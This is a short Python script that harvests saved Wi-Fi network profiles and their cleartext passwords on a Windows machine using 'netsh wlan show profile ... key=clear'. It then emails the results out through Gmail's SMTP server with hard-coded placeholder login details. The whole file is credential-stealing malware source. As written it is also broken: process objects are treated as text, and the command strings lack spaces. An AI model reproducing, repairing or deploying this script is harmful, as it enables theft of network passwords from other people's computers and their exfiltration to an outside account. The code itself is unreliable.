#!/usr/bin/env python

import re
import smtplib
import subprocess


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
# it Popen exucutes the commands that you give it and continues program execution
networks = subprocess.Popen(command, shell=True)
networks_names_list = re.findall("(?:Profile\s*:\s) (.*)", networks)

result = ""
for network_name in networks_names_list:
    command = "netsh wlan show profile" + network_name + "key=clear"
    current_result = subprocess.Popen(command, shell=True)
    result = result + current_result

send_mail("johnwick@gmail.com", "123456789", result)
